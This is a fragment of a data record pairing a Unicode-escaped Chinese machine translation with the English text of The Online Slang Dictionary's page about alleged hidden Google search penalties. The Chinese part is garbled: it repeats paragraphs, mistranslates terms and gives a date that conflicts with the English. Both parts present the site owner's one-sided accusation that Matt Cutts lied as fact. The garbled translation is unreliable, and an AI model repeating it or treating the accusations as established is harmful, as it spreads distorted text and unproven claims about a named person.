cd5\u5f8b\u3002\n\u6211\u5c1d\u8bd5\u4e86\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u6765\u6062\u590d\u5f15\u7528\uff0c\u4f46\u8fd9\u5e76\u6ca1\u6709\u6d88\u9664\r\u5904\u7f5a\u3002\u5728\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u6ca1\u6709\u610f\u8bc6\u5230\u5904\u7f5a\u662f\u624b\u52a8\u7684\u3002(\u8bf7\u8bb0\u4f4f\uff0c\u8fd9\u4e00\u70b9\r\u624b\u52a8\u5904\u7f5a\u88ab\u8bbe\u7f6e\u4e3a\u5bf9\u6211\u9690\u85cf\u3002)\u3002\u5982\u679c\u6211\u77e5\u9053\uff0c\u6211\u5c31\u4e0d\u4f1a\u7ee7\u7eed\u4e86\r\u8bd5\u56fe\u5411\u6211\u7684\u53c2\u89c2\u8005\u5c55\u793a\u8fd9\u4e00\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u3002\n2012\u5e7411\u670816\u65e5\uff0c\u4e3a\u4e86\u80fd\u591f\u4e0e\u90a3\u4e9b\u6ca1\u6709\u7684\u8bcd\u5178\u7f51\u7ad9\u7ade\u4e89\r\u5f15\u7528\uff0c\u6211\u518d\u6b21\u5220\u9664\u4e86\u6240\u6709\r\u5f15\u6587\u3002\n\u6211\u66fe\u5e0c\u671b\u8fd9\u4f1a\u5bfc\u81f4\u5904\u7f5a\u88ab\u53d6\u6d88\u3002\u5c31\u662f\u6211\u5e0c\u671b\r\u5bf9\u8fd9\u4e2a\u7f51\u7ad9\u6267\u884c\u5904\u7f5a\u7684\u8c37\u6b4c\u5458\u5de5\u4f1a\u770b\u5230\u6211\u5220\u9664\u4e86\r\u4f20\u7968\uff0c\u5e76\u5c06\u64a4\u9500\u5904\u7f5a\u3002\n\u9a6c\u7279\u00b7\u5361\u8328(Matt Cutts)\u662f\u8c37\u6b4c\u7684\u524d\u96c7\u5458\u3002\u5f53\u4ed6\u5728\u8c37\u6b4c\u65f6\uff0c\u4ed6\u8d1f\u8d23\u7f51\u7edc\u5783\u573e\u90ae\u4ef6\u56e2\u961f-\r\u8d1f\u8d23\u81ea\u52a8\u5904\u7f5a\u548c\u624b\u52a8\u5904\u7f5a\u7684\u56e2\u961f\u3002\u4ed6\u4eec\r\u521b\u5efa\u6267\u884c\u81ea\u52a8\u5904\u7f5a\u7684\u7b97\u6cd5\u5e76\u4e3a\u5176\u7f16\u5199\u7b56\u7565\r\u6267\u884c\u4eba\u5de5\u5904\u7f5a\u7684\u3002\n2013\u5e743\u670821\u65e5\uff0c\u9a6c\u7279\u00b7\u5361\u8328(Matt Cutts)\u5199\u4e86\u4ee5\u4e0b\u5185\u5bb9\uff0c\u4ee5\u56de\u5e94\u6709\u4eba\u95ee\u53ca\r\u5f53\u8c37\u6b4c\u5728#\u5e74\u5c06Digg.com\u6458\u724c\u65f6\uff0c\u4e00\u4e2a\u5c0f\u7f51\u7ad9\u7684\u6240\u6709\u8005\u53ef\u80fd\u4f1a\u5f97\u5230\u89e3\u51b3\u7f5a\u6b3e\u7684\u95ee\u9898\r\u5b83\u7684\u5168\u90e8\u3002\u5361\u8328\u56de\u5e94\u8bf4\uff0c\u5728\r\u90e8\u5206\uff1a\n\u901a\u5e38\uff0c\u5f53\u7f51\u7edc\u5783\u573e\u90ae\u4ef6\u56e2\u961f\u7684\u6210\u5458\u76f4\u63a5\u5e94\u7528\u624b\u52a8\u7f51\u7edc\u5783\u573e\u90ae\u4ef6\u64cd\u4f5c\u65f6\r\u5bf9\u4e8e\u4e00\u4e2a\u7f51\u7ad9\uff0c\u6211\u4eec\u8fd8\u4f1a\u7ed9http://google.com/webmasters/\u7684\u7f51\u7ad9\u6240\u6709\u8005\u7559\u4e0b\u4e00\u5f20\u4fbf\u6761\u3002\r\u8fd9\u6709\u52a9\u4e8e\u7f51\u7ad9\u6240\u6709\u8005\u5224\u65ad\u624b\u52a8\u5783\u573e\u90ae\u4ef6\u662f\u5426\u6709\u95ee\u9898\uff0c\u800c\u4e0d\u662f\u4ec5\u4ec5\r\u7b97\u6cd5\u6392\u540d\u3002\u5219\u4efb\u4f55\u7ad9\u70b9\u90fd\u53ef\u4ee5\u5728\u540c\u4e00\u5730\u70b9\u6216\r\u8bf7\u5728\u6211\u4eec\u7684\u7ad9\u957f\u8bba\u575bhttps://productforums.google.com/forum/#\uff01forum/webmasters\u4e0a\u53d1\u8868\u5e16\u5b50\u3002\n\u6211\u56de\u7b54\u8bf4\uff0c\u867d\u7136\u6211\u7684\u7f51\u7ad9\u4f3c\u4e4e\u53d7\u5230\u4e86\u4eba\u5de5\u5904\u7f5a\uff0c\r\u6211\u6ca1\u6709\u6536\u5230\u4efb\u4f55\u5f62\u5f0f\u7684\u4eba\u5de5\u5904\u7f5a\u7684\u901a\u77e5\u30022013\u5e743\u670822\u65e5\r\u5361\u8328\u56de\u7b54\u8bf4\uff1a\n\u55e8\uff0c\u6c83\u5c14\u7279\uff0c\u6211\u770b\u5230\u7684\u5173\u4e8eonlineslangdictionary.com\u7684\u552f\u4e00\u624b\u52a8\u7f51\u7edc\u5783\u573e\u90ae\u4ef6\u64cd\u4f5c\u662f\r\u51e0\u5e74\u524d(\u60a8\u662f\u5426\u719f\u6089\u4e00\u5bb6\u540d\u4e3aWeb Build Pages\u7684\u516c\u53f8\u6216\u67d0\u4eba\r\u53eb\u5409\u59c6\u00b7\u535a\u4f0a\u91d1\uff1f)\uff0c\u4f46\u8fd9\u4e0d\u518d\u9002\u7528\u4e8e\u8fd9\u91cc\u3002\n\u5728\u6211\u4eec\u7684\u4e00\u822c\u7f51\u7edc\u6392\u540d\u4e2d\uff0c\u60a8\u4f1a\u53d7\u5230\u51e0\u4e2a\u7b97\u6cd5\u7684\u5f71\u54cd\u3002\u7b2c\u4e00\u4e2a\u662f\u6211\u4eec\u7684\u9875\u9762\r\u5e03\u5c40\u7b97\u6cd5\u3002\u8bf7\u53c2\u9605http://googlewebmastercentral.blogspot.com/2012/01/page-layo...\u3002\u6216\rHttp://searchengineland.com/google-may-penalize-ad-heavy-pag...\u3002\u4e3a\u4e86\u66f4\u591a\r\u5173\u4e8e\u90a3\u4ef6\u4e8b\u7684\u80cc\u666f\u3002\u5177\u4f53\u5730\u8bf4\uff0c\u5c06\u50cfhttp://onlineslangdictionary.com/meaning-definition-of/compy\u8fd9\u6837\u7684\u9875\u9762\u4e0e\u9875\u9762\u8fdb\u884c\u6bd4\u8f83\r\u5c31\u50cfhttp://www.urbandictionary.com/define.php?term=Pepperazzi...\u4e00\u6837\u3002\uff0c\u60a8\u7684\u7ad9\u70b9\r\u4e0e\u57ce\u5e02\u8bcd\u5178\u76f8\u6bd4\uff0c\u6298\u53e0\u4e0a\u65b9\u7684\u5e7f\u544a\u8981\u7a81\u51fa\u5f97\u591a\u3002\n\u60a8\u7684\u7ad9\u70b9\u4e5f\u4f1a\u53d7\u5230\u6211\u4eec\u7684\u718a\u732b\u7b97\u6cd5\u7684\u5f71\u54cd\u3002\u8fd9\u662f\u6211\u4eec\u5199\u7ed9\u5927\u5bb6\u7684\u4e00\u7bc7\u535a\u6587\r\u53d7\u718a\u732b\u5f71\u54cd\u7684\u7f51\u7ad9\u6307\u5357\uff1ahttp://googlewebmastercentral.blogspot.com/2011/05/more-guid...\u3002\n\u55e8\uff0c\u6c83\u5c14\u7279\uff0c\u6211\u770b\u5230\u7684\u5173\u4e8eonlineslangdictionary.com\u7684\u552f\u4e00\u624b\u52a8\u7f51\u7edc\u5783\u573e\u90ae\u4ef6\u64cd\u4f5c\u662f\r\u51e0\u5e74\u524d(\u60a8\u662f\u5426\u719f\u6089\u4e00\u5bb6\u540d\u4e3aWeb Build Pages\u7684\u516c\u53f8\u6216\u67d0\u4eba\r\u53eb\u5409\u59c6\u00b7\u535a\u4f0a\u91d1\uff1f)\uff0c\u4f46\u8fd9\u4e0d\u518d\u9002\u7528\u4e8e\u8fd9\u91cc\u3002\n(\u5982\u679c\u4f60\u719f\u6089\u7f51\u7edc\u6392\u540d\u548c\u641c\u7d22\u5f15\u64ce\u4f18\u5316\u516c\u53f8\uff0c\u8fd9\u662f\u4e00\u4e2a\u6709\u8da3\u7684\u601d\u8003\u5b9e\u9a8c\r\u662f\uff1a\u5982\u679c\u9a6c\u7279\u00b7\u5361\u8328\u8bf4\u7684\u662f\u5b9e\u8bdd\uff0c\u5bf9\u6211\u7684\u7f51\u7ad9\u8fdb\u884c\u4eba\u5de5\u5904\u7f5a-\u6216\u8005\r\u4efb\u4f55\u7ad9\u70b9-\u540c\u65f6\u7ed1\u5b9a\u5230\u7279\u5b9a\u7684\u4e2a\u4eba\u548c\u7279\u5b9a\u7684\u516c\u53f8\uff1f\u4f8b\u5982\uff0c\u662f\u5426\r\u4e00\u5bb6\u641c\u7d22\u5f15\u64ce\u4f18\u5316\u516c\u53f8\u7684\u6240\u6709\u8005\u6539\u53d8\u4e3b\u610f\uff0c\u4e3a\u8c37\u6b4c\u63d0\u4f9b\u5b8c\u6574\u7684\u5ba2\u6237\r\u800c\u8c37\u6b4c\u5728\u6ca1\u6709\u4efb\u4f55\u5206\u6790\u7684\u60c5\u51b5\u4e0b\uff0c\u53ea\u662f\u624b\u52a8\u60e9\u7f5a\u4e86\u8be5\u7f51\u7ad9\r\u6bcf\u4e00\u4f4d\u987e\u5ba2\u7684\u540d\u5b57\u5417\uff1f\u8fd9\u4e0d\u662f\u5b83\u7684\u5de5\u4f5c\u65b9\u5f0f\u3002\u6211\u4ece\u6765\u6ca1\u6709\u542c\u8bf4\u8fc7\r\u4e2a\u4eba\u6216\u516c\u53f8\u3002\u624b\u52a8\u5904\u7f5a\u7684\u5408\u6cd5\u65b9\u5f0f\u662f\u4ec0\u4e48\uff1f\r\u9488\u5bf9\u6211\u7684\u7ad9\u70b9-\u6216\u4efb\u4f55\u7ad9\u70b9-\u4ee5\u67d0\u79cd\u65b9\u5f0f\u4e0e\u7279\u5b9a\u7684\u4eba\u548c\r\u5177\u4f53\u7684\u516c\u53f8\uff1f)\u3002\n\u4ece\u6765\u6ca1\u6709\u9488\u5bf9\u8be5\u7f51\u7ad9\u7684\u4efb\u4f55\u624b\u52a8\u7f51\u7edc\u5783\u573e\u90ae\u4ef6\u64cd\u4f5c\u3002\u6d41\u91cf\u5206\u6790\r\u8c37\u6b4c\u641c\u7d22\u663e\u793a\u589e\u957f\u5e73\u7a33\uff0c\u76f4\u5230\u9a6c\u7279\u00b7\u5361\u8328\u51b3\u5b9a\u627c\u6740\r\u7f51\u7ad9\u3002\u6ca1\u6709\u4efb\u4f55\u4eba\u5de5\u5904\u7f5a\u7684\u8bc1\u636e\uff0c\u8fd9\u5728\r\u6d41\u91cf\u5206\u6790\u3002\n\u5728\u6211\u4eec\u7684\u4e00\u822c\u7f51\u7edc\u6392\u540d\u4e2d\uff0c\u60a8\u4f1a\u53d7\u5230\u51e0\u4e2a\u7b97\u6cd5\u7684\u5f71\u54cd\u3002\u7b2c\u4e00\u4e2a\u662f\u6211\u4eec\u7684\u9875\u9762\r\u5e03\u5c40\u7b97\u6cd5\u3002\u8bf7\u53c2\u9605http://googlewebmastercentral.blogspot.com/2012/01/page-layo...\u3002\u6216\rHttp://searchengineland.com/google-may-penalize-ad-heavy-pag...\u3002\u4e3a\u4e86\u66f4\u591a\r\u5173\u4e8e\u90a3\u4ef6\u4e8b\u7684\u80cc\u666f\u3002\u5177\u4f53\u5730\u8bf4\uff0c\u5c06\u50cfhttp://onlineslangdictionary.com/meaning-definition-of/compy\u8fd9\u6837\u7684\u9875\u9762\u4e0e\u9875\u9762\u8fdb\u884c\u6bd4\u8f83\r\u5c31\u50cfhttp://www.urbandictionary.com/define.php?term=Pepperazzi...\u4e00\u6837\u3002\uff0c\u60a8\u7684\u7ad9\u70b9\r\u4e0e\u57ce\u5e02\u8bcd\u5178\u76f8\u6bd4\uff0c\u6298\u53e0\u4e0a\u65b9\u7684\u5e7f\u544a\u8981\u7a81\u51fa\u5f97\u591a\u3002\n\u5c3d\u7ba1\u9a6c\u7279\u00b7\u5361\u8328\u58f0\u79f0\u4e0e\u4e4b\u76f8\u53cd\uff0c\u4f46\u201c\u57ce\u5e02\u8bcd\u5178\u201d\u5b9e\u9645\u4e0a\u6709\u66f4\u591a\u7684\u8bcd\u6761\u3002\r\u6bd4\u8fd9\u4e2a\u7f51\u7ad9\u66f4\u9002\u5408\u5e7f\u544a\u7684\u5c4f\u5e55\u533a\u57df\u3002\n\u5c3d\u7ba1\u5982\u6b64\uff0c\u6211\u8fd8\u662f\u5220\u9664\u4e86\u5927\u7ea66\u4e2a\u6708\u7684\u6240\u6709\u5e7f\u544a\u3002\u4e0d\u4f1a\u6709\u4efb\u4f55\u53d8\u5316\r\u8c37\u6b4c\u63d0\u5230\u6211\u7684\u7f51\u7ad9\u7684\u641c\u7d22\u6d41\u91cf\u3002(\u8bf7\u8bb0\u4f4f\uff0c\u5f53\r\u4ee5\u524d\u7684\u81ea\u52a8\u5904\u7f5a\u88ab\u53d6\u6d88\uff0c\u641c\u7d22\u6d41\u91cf\u6062\u590d-\u8fd9\u662f\u5982\u4f55\u5b9e\u73b0\u7684\r\u81ea\u52a8\u5904\u7f5a\u8d77\u4f5c\u7528\u3002)\u3002\u95ee\u9898\u89e3\u51b3\u540e\uff0c\u81ea\u52a8\u5904\u7f5a\u5c06\u88ab\u5220\u9664\u3002\u5b83\r\u8fd9\u79cd\u60c5\u51b5\u4e0d\u4f1a\u7acb\u5373\u53d1\u751f\uff0c\u4f46\u53d1\u751f\u7684\u901f\u5ea6\u8981\u6bd46\u4e2a\u6708\u5feb\u5f97\u591a\u3002\u5b83\u662f\u505a\u4ec0\u4e48\u7684\uff1f\r\u5982\u679c\u95ee\u9898\u5df2\u7ecf\u89e3\u51b3\uff0c\u800c\u60e9\u7f5a\u4ece\u672a\u88ab\u53d6\u6d88\uff0c\u90a3\u662f\u4ec0\u4e48\u610f\u601d\uff1f\u8fd9\u610f\u5473\u7740\u60e9\u7f5a\r\u4ece\u4e00\u5f00\u59cb\u5c31\u4e0d\u5b58\u5728\u3002\n\u60a8\u7684\u7ad9\u70b9\u4e5f\u4f1a\u53d7\u5230\u6211\u4eec\u7684\u718a\u732b\u7b97\u6cd5\u7684\u5f71\u54cd\u3002\u8fd9\u662f\u6211\u4eec\u5199\u7ed9\u5927\u5bb6\u7684\u4e00\u7bc7\u535a\u6587\r\u53d7\u718a\u732b\u5f71\u54cd\u7684\u7f51\u7ad9\u6307\u5357\uff1ahttp://googlewebmastercentral.blogspot.com/2011/05/more-guid...\u3002\n\u5c31\u5728\u6211\u5220\u9664\u5e7f\u544a\u7684\u540c\u65f6\uff0c\u6211\u4e5f\u5220\u9664\u4e86\u6240\u6709\u7684\u5f15\u6587\u3002\u4e0d\u4f1a\u6709\u4efb\u4f55\u53d8\u5316\r\u8c37\u6b4c\u63d0\u5230\u6211\u7684\u7f51\u7ad9\u7684\u641c\u7d22\u6d41\u91cf\u3002(\u8bf7\u8bb0\u4f4f\uff0c\u5f53\u4e0a\u4e00\u4e2a\r\u53d6\u6d88\u4e86\u81ea\u52a8\u5904\u7f5a\uff0c\u6062\u590d\u4e86\u641c\u7d22\u6d41\u91cf-\u8fd9\u5c31\u662f\u81ea\u52a8\u5316\u7a0b\u5ea6\r\u60e9\u7f5a\u662f\u6709\u6548\u7684\u3002)\u3002\u95ee\u9898\u89e3\u51b3\u540e\uff0c\u81ea\u52a8\u5904\u7f5a\u5c06\u88ab\u5220\u9664\u3002\u5b83\u4e0d\u4f1a\r\u7acb\u5373\u53d1\u751f\uff0c\u4f46\u53d1\u751f\u7684\u901f\u5ea6\u8981\u6bd46\u4e2a\u6708\u5feb\u5f97\u591a\u3002\u5982\u679c\u8fd9\u610f\u5473\u7740\u4ec0\u4e48\r\u8fd9\u4e2a\u95ee\u9898\u5df2\u7ecf\u89e3\u51b3\u4e86\uff0c\u800c\u60e9\u7f5a\u4ece\u6765\u6ca1\u6709\u53d6\u6d88\u8fc7\u5417\uff1f\u8fd9\u610f\u5473\u7740\u5904\u7f5a\u6ca1\u6709\r\u4e00\u5f00\u59cb\u5c31\u5b58\u5728\u3002\n\u6240\u4ee5\u95ee\u9898\u4ecd\u7136\u5b58\u5728\uff1a\u6211\u5982\u4f55\u786e\u5207\u5730\u77e5\u9053\u9a6c\u7279\u00b7\u5361\u8328\u5728\u6492\u8c0e\uff1f\u6211\u8be5\u600e\u4e48\u505a\r\u77e5\u9053\u5bf9\u6211\u7684\u7f51\u7ad9\u6709(\u548c\u662f\u5426)\u4eba\u5de5\u5904\u7f5a\u5417\uff1f\n\u6211\u5c06\u5f00\u59cb\u516c\u5e03\u6211\u4e0e\u8c37\u6b4c\u5458\u5de5\u7535\u5b50\u90ae\u4ef6\u5bf9\u8bdd\u7684\u7ec6\u8282\uff0c\r\u6700\u7ec8\u6211\u53d1\u5e03\u4e86\u4e00\u4e2a\u5305\u542b\u5b8c\u6574\u6807\u9898\u7684Mbox\u6587\u4ef6\u3002\r\u5927\u7ea6\u5728\u6211\u4e0e\u9a6c\u7279\u00b7\u5361\u8328(Matt Cutts)\u4ea4\u6d41\u7684\u65f6\u5019(\u89c1\u4e0a\u6587)\uff0c\u6211\u8fdb\u884c\u4e86\u4e00\u6b21\u7535\u5b50\u90ae\u4ef6\u4ea4\u8c08\r\u548c\u4e00\u540d\u8c37\u6b4c\u5458\u5de5\u5728\u4e00\u8d77\u3002\u5927\u6982\u662f\u8fd9\u6837\u7684\u3002(\u4e0b\u9762\u7684\u5185\u5bb9\u5f88\u91cd\r\u6539\u8ff0\u8fc7\u4e86\u3002\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\uff0c\u4e0b\u9762\u7684\u5185\u5bb9\u4f1a\u8d8a\u6765\u8d8a\u63a5\u8fd1\u5b9e\u9645\u60c5\u51b5\u3002\r\u5bf9\u8bdd\u3002)\r\u563f\uff0c\u6211\u770b\u5230\u4f60\u4eec\u7f51\u7ad9\u4e0a\u7684\u90a3\u7bc7\u6587\u7ae0\u4e86\u3002\u6709\u4ec0\u4e48\u6211\u80fd\u5e2e\u5fd9\u7684\u5417\uff1f\n\u4e3b\u9898\uff1aRe\uff1a\u4f60\u5173\u4e8e\u5904\u7f5a\u7684\u6587\u7ae0\u662f\u600e\u4e48\u56de\u4e8b\uff1f\r\u51fa\u53d1\u5730\uff1a\u6c83\u5c14\u7279\u00b7\u96f7\u5fb7\r\u65e5\u671f\uff1a2013\u5e74\u4fee\u8ba2\u65e5\u671f\u3002\n\u662f\u3002\u4f60\u80fd\u95ee\u95ee\u7f51\u7edc\u5783\u573e\u90ae\u4ef6\u5c0f\u7ec4\u4eba\u5de5\u5904\u7f5a\u662f\u600e\u4e48\u56de\u4e8b\u5417\uff1f\r\u9488\u5bf9\u6211\u7684\u7f51\u7ad9\u5417\uff1f\n\u6709\u4e00\u6bb5\u65f6\u95f4\u4ee5\u6765\uff0c\u60a8\u7684\u7f51\u7ad9\u90fd\u53d7\u5230\u4e86\u4eba\u5de5\u5904\u7f5a\u3002\u6211\u5e2e\u4e0d\u4e0a\u5fd9\u3002\r\u4f60\u3002\n\u81ea2020\u5e7410\u6708\u8d77\uff0c\u5904\u7f5a\u4ecd\u5728\u8fdb\u884c\u4e2d\uff0c\u5e76\u6b63\u5728\u627c\u6740\u7f51\u7edc\u4fda\u8bed\r\u5b57\u5178\u3002\n\u8bf7\u5e2e\u6211\u628a\u8fd9\u4e2a\u6d88\u606f\u4f20\u64ad\u51fa\u53bb\u3002\u5982\u679c\u4f60\u53d1\u73b0\u5728\u7ebf\u4fda\u8bed\u8bcd\u5178\u662f\r\u6709\u7528\u7684\uff0c\u8bf7\u8ba9\u4f60\u7684\u670b\u53cb\u548c\u540c\u4e8b\u77e5\u9053\u8fd9\u4e2a\u7f51\u7ad9\u3002\u7701\u94b1\u7684\u552f\u4e00\u529e\u6cd5\r\u8fd9\u662f\u4e3a\u4e86\u628a\u8bdd\u4f20\u51fa\u53bb\u3002\n\u5982\u679c\u4f60\u5728\u8c37\u6b4c\u5de5\u4f5c\uff0c\u6211\u4eec\u5e94\u8be5\u5f88\u5feb\u518d\u8c08\u3002\u6211\u7684\u7535\u8bdd\u662f\u3002\n\u6211\u521a\u521a\u5728\u8c37\u6b4c\u4e0a\u641c\u7d22\u4e86\u4e00\u4e0b\uff0c\u4f60\u7684\u7f51\u7ad9\u51fa\u73b0\u5728\u524d\u51e0\u4e2a\u7ed3\u679c\u4e2d\u3002\u662f\u8fd9\u6837\u5417\uff1f\r\u610f\u5473\u7740\u5904\u7f5a\u5df2\u7ecf\u53d6\u6d88\u4e86\u5417\uff1f\n\u8c37\u6b4c\u679c\u6c41(Google Juice)\u662f\u4e00\u4e2a\u975e\u6b63\u5f0f\u672f\u8bed\uff0c\u6307\u7684\u662f\u8c37\u6b4c\u5bf9\u7f51\u7ad9\u548c\u9875\u9762\u7684\u597d\u611f\u7a0b\u5ea6\r\u5728\u90a3\u4e2a\u7f51\u7ad9\u4e0a\u3002\u6709\u5f88\u591a\u56e0\u7d20\u4f1a\u5f71\u54cd\u5230\u7f51\u7ad9\u4e0a\u6709\u591a\u5c11\u679c\u6c41\u548c\r\u9875\u9762\u6536\u5165\u3002\n\u6bcf\u6b21\u4f60\u8fdb\u884c\u641c\u7d22\u65f6\uff0c\u8c37\u6b4c\u7684\u7b97\u6cd5\u90fd\u4f1a\u5bf9\u7f51\u7edc\u4e0a\u7684\u6bcf\u4e2a\u9875\u9762\u8fdb\u884c\u8bc4\u4f30\uff0c\u4ee5\r\u786e\u5b9a\u6bcf\u4e2a\u9875\u9762\u4e0e\u60a8\u7684\u67e5\u8be2\u6709\u591a\u76f8\u5173-\u6bcf\u4e2a\u9875\u9762\u6709\u591a\u5c11Google Juice\r\u7528\u4e8e\u60a8\u7684\u67e5\u8be2\u3002\u7136\u540e\uff0c\u5b83\u4eec\u663e\u793a\u641c\u7d22\u7ed3\u679c\uff0c\u8fd9\u4e9b\u7ed3\u679c\u6309\r\u6bcf\u4e2a\u9875\u9762\u90fd\u6709\u8c37\u6b4c\u679c\u6c41\u3002\n\u5904\u7f5a\u662f\u4ece\u8fd9\u4e2a\u9875\u9762\u4e0a\u7684\u6bcf\u4e2a\u9875\u9762\u51cf\u53bb\u4e00\u5b9a\u6570\u91cf\u7684Google Juice\r\u5730\u70b9\u3002\u4f46\u8fd9\u662f\u5426\u610f\u5473\u7740\u6211\u4eec\u5728\u641c\u7d22\u7ed3\u679c\u4e2d\u6392\u5728\u7b2c\u4e00\u3001\u7b2c\u4e8c\u6216\u7b2c307\u4f4d\uff0c\u8fd9\u53d6\u51b3\u4e8e\u6211\u4eec\u5728\u641c\u7d22\u7ed3\u679c\u4e2d\u6392\u540d\u591a\u5c11\r\u4e3a\u60a8\u7684\u67e5\u8be2\u63d0\u4f9b\u7f51\u7edc\u4e0a\u5176\u4ed6\u6bcf\u4e2a\u9875\u9762\u7684\u4fe1\u606f\u3002\n\u4f60\u53ef\u4ee5\u628a\u5b83\u60f3\u8c61\u6210\u4e00\u573a\u5f92\u6b65\u8d5b\u8dd1\u3002\u60e9\u7f5a\u5e76\u4e0d\u50cf\u4e0b\u9762\u90a3\u6837\u8d77\u4f5c\u7528\uff1a\u7136\u800c\u4f60\r\u5728\u6bd4\u8d5b\u7ed3\u675f\u65f6\uff0c\u8c37\u6b4c\u4f1a\u8ba9\u4f60\u843d\u540e9\u4f4d\u3002\u5b83\u8d77\u4f5c\u7528\u4e86\u3002\n.", "note_en": "If you find this page interesting, I&#39;d love to chat with you.\r If you work for Google, then we should speak soon. I can be reached at .\n          This website has been penalized by Google under suspicious circumstances. The penalty\rcauses our web pages to appear at lower positions in Google&#39;s search results than what\rthey&#39;ve earned on their merit. It is an  intentional, hidden, manual penalty executed by\rGoogle against this site.\n  Publicly, the company says that websites can discover and fight these manual penalties via a\rtool they provide. What they don&#39;t disclose is that   Google can and does\rexecute hidden penalties against sites. Since they&#39;re hidden, there&#39;s no way for\rsite owners to respond to - or even know about - the fact that Google is intentionally limiting\rvisitors to their sites. Websites live or die based on people visiting the site.\rThis means that  Google kills websites\rin private, with no recourse for the site owners. And there is no oversight or accountability.\n  Urban Dictionary&#39;s owner and former Google employee Aaron Peckham with Google&#39;s former head of penalties Matt Cutts.\n  To my knowledge, Google&#39;s ability to destroy websites in this manner has not been\rdisclosed before.\n  I was only made aware of the penalty after a whistle-blower informed me of it.\n  Separately, when confronted about this hidden penalty,   a Google employee lied to\rme and to the public about it. That Google employee is  Matt Cutts, the\rformer head of the Google team that executes penalties against websites. He quietly\rleft the company after an extended &#34;sabbatical&#34; and, tellingly, no one has been hired to\rreplace him.\n  This is an initial information drip. I will be releasing more information over\rtime. For example, the entire entire\rcommunication history with the whistleblower - including associated metadata.\n  Please help me in spreading the word. If you&#39;ve found The Online Slang Dictionary to\rbe useful, please let your friends and colleagues know about the site. The only way to\rsave it is to get the word out.\n            Started by Walter Rader in 1996, The Online Slang Dictionary is the oldest slang dictionary on the web\rand the first to accept submissions from visitors. Serving 1.5 million visitors each month,\rit provides more than 28,000  real definitions for over 19,000 actual slang words\rand phrases. The site offers the only slang thesaurus on the web, which is fully integrated\rwith the dictionary. Other unique features include showing you how common each word is,\rhow vulgar it is, and where geographically it&#39;s used. Logged in visitors can add words and\rdefinitions.\n  The site isn&#39;t perfect: I totally acknowledge that. I just want my site to be able\rto compete on its own merits, rather than being intentionally crippled by Google.\n    This site has more than 5,700 citations curated by hand from published sources like TV\rprograms, films, news publications, and magazines - and added by hand to the appropriate\rdefinitions. Each is a short 1 - 3 sentence excerpt, with proper attribution. This site\ris the only freely available slang dictionary on the web that has citations.\n  The first penalty executed against this site by Google was automated. That is, the\rpenalty was applied by an algorithm - not a human. This algorithm has a bug: it\rmistakenly thinks that the citations on this site are an indication of a low-quality site\rthat should be penalized.\n  Further, Google hides automated penalties from website owners, so there was no way for\rme to know the cause of the penalty.\n  Real dictionaries have citations because that&#39;s how they show that their definitions\r are real. Being a dictionary of real slang terms, the same applies to us. Citations\r serve the same purpose in dictionaries as they do on Wikipedia: they provide evidence\r for stated facts. Unlike encyclopedias such as Wikipedia, dictionary citations are\r inline excerpts rather than links to outside works.\n  After months of this algorithm at Google intentionally limiting the traffic to this\rsite, and after months of experimentation and thousands of changes made to the site, I\rremoved the citations - more than 5,700. This was a desperate experiment, having tried\reverything else I could think of to try to eliminate the penalty. This caused the penalty\rto be undone, again automatically, by the algorithm.\n    A Google employee later executed a manual penalty against the site. Recall that a\rpenalty against a web site causes web pages on that site to appear at a lower position in\rGoogle&#39;s search results than the position they have earned on their merit. A manual\rpenalty is one that has been activated by a human, by hand.\n  On October 9, 2011, a Google employee set an internal flag that executed a penalty\ragainst this site in a way that is both impossible to undo, and impossible to detect by\rthe site owner (me.)\n  I was only made aware of the penalty after a whistle-blower informed me of it.\n  There is no  truthful justification for this penalty. However, when a manual\rpenalty is activated, a reason can be recorded. The Google employee recorded the reason\ras being related to intellectual property law. But that makes no sense as there are no -\rand have never been any - intellectual property law violations on this site.\n  If you work for Google, then we should speak soon. I can be reached at .\n      ( Show this section Hide this section.)\r\r In 2011, Google released a change to their ranking algorithms designed to penalize low-quality\rwebsites. One thing Google now believes is an indicator of low quality is displaying excerpts\rof content that exists elsewhere.\rDespite citations being a hallmark of a high-quality dictionary, they get interpreted by\rthis change (called Panda) as the complete opposite, because  by definition\rcitations are content that exists elsewhere.\n  This site has more than 5,700 citations curated by hand from published sources like TV\rprograms, films, news publications, and magazines - and added by hand to the appropriate\rdefinitions. Each is a short 1 - 3 sentence excerpt, with proper attribution. This site\ris the only freely available slang dictionary on the web that has citations.\n  In addition to the 5,700 citations on this website, we have another 11,400 to be added,\rwhich would bring the total citation count to more than 17,000.\n  But we can&#39;t show them to you. That&#39;s why they appear blacked out, as in a redacted\rclassified document. When Google started penalizing this site, it was because we\rhave citations. There is a bug in one of Google&#39;s algorithms, related to a set of changes\rthey call &#34;Panda 2.0&#34;. This bug incorrectly interprets the citations as evidence that the\rsite is  low quality, despite citations being a sign of the exact opposite: a\r high quality dictionary. This penalty was automated: it didn&#39;t require any human\rintervention. Removing the citations resulted in the penalty being removed, also\rautomatically.\n  So since we can&#39;t show you citations, there&#39;s no reason to add the additional 11,400 citations\rmentioned above.\n    The following shows the consequence of this penalty, measured in visits to this site from\rGoogle searches.\n            April 11: Google releases the Panda algorithm changes globally to all\r English-speaking users, and starts penalizing this site.\n  November 5: I remove all citations, largely as an experiment. I couldn&#39;t believe\r Google would be penalizing a dictionary website because of the presence of citations.\n    Google&#39;s Panda changes - designed to penalize what Google&#39;s algorithms believe\rare &#34;low-quality&#34; sites - were released globally to all English-speaking users on April 11,\r2011. Visits to The Online Slang Dictionary that were the result of a Google\rsearch dropped markedly on April 11, 2011.\n            The loss in traffic was limited to visits from Google searches. No other traffic sources (other\rsearch engines,\rdirect traffic, or referral traffic) were affected. Such a drop is unprecedented for the site\rsince I began tracking site analytics in 2007.\n  Specifically, traffic declined because Google moved this site to a lower position in its\rsearch results. Reports from Google Webmaster Tools show that the position of The Online Slang\rDictionary in Google search results fell on April 11, the date of the Panda penalty.\n          The reports that I have access to cover a time period of a month, rather than a single day. So\rthe effects of the penalty only start to become evident in the report dated March 12 - April 11.\rThe next dated report goes through April 12, so it includes 2 days of penalty. The subsequent\rreport includes 3 days of penalty, and so forth. As more days of the penalty are within the\rdate range of the report, the amount of the decline is increasingly revealed.\r\r(Why the uptick at the end? Because the reports show a range, the final report that includes\rApril 11 is dominated by subsequent dates. There was a small uptick in ranking during those\rdates - which did not restore traffic - then the ranking dropped back down.)\n  So as the data shows, The Online Slang Dictionary 